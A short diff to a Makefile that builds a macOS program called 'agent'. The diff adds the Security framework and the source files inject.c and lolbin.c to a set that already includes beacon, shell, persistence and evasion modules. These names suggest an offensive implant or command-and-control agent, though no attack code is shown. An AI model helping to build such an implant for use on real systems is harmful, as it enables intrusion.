@@ -1,8 +1,8 @@
 CC      = clang
 CFLAGS  = -O2 -Wall -Wextra -mmacosx-version-min=12.0
-LDFLAGS = -framework CoreFoundation
+LDFLAGS = -framework CoreFoundation -framework Security
 TARGET  = agent
-SRCS    = main.c beacon.c shell.c persist.c evasion.c
+SRCS    = main.c beacon.c shell.c persist.c evasion.c inject.c lolbin.c
 OBJS    = $(SRCS:.c=.o)
 
 all: $(TARGET)
